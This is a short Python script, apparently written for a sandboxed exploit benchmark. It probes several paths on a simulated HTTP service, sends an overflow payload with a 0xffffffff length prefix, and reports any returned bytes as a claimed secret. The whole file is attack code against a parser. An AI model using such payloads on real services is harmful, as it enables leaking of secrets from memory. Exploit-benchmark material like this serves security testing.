import sys, json, base64, binascii, os, time

def send_http(req):
    # Print request JSON line
    print(json.dumps({"http": req}), flush=True)
    # Read response line
    line = sys.stdin.readline()
    if not line:
        sys.exit(0)
    resp = json.loads(line)
    return resp

def try_path(path, method="GET", body_hex=None):
    req = {"method": method, "path": path, "headers": {"User-Agent": "exploit"}}
    if body_hex is not None:
        req["body_hex"] = body_hex
    resp = send_http(req)
    return resp

def main():
    # First, discover a viable endpoint via GET
    candidate_paths = ["/", "/parse", "/record", "/vuln", "/test"]
    viable = None
    for p in candidate_paths:
        resp = try_path(p)
        # consider 200 OK as viable
        if resp.get("status") == 200:
            viable = p
            break
    if viable is None:
        viable = "/parse"  # fallback
    # Craft overflow payload: 4-byte length = 0xffffffff, then a single 'A'
    payload = b"\xff\xff\xff\xffA"
    body_hex = payload.hex()
    resp = try_path(viable, method="POST", body_hex=body_hex)
    # Decode response body
    body_b64 = resp.get("body_b64", "")
    try:
        body = base64.b64decode(body_b64)
    except Exception:
        body = b""
    # If body looks like secret (non-empty), output it
    secret_hex = body.hex()
    # Final claim
    claim = {"secret_hex": secret_hex}
    print(f"CLAIM:{json.dumps(claim)}")

if __name__ == "__main__":
    main()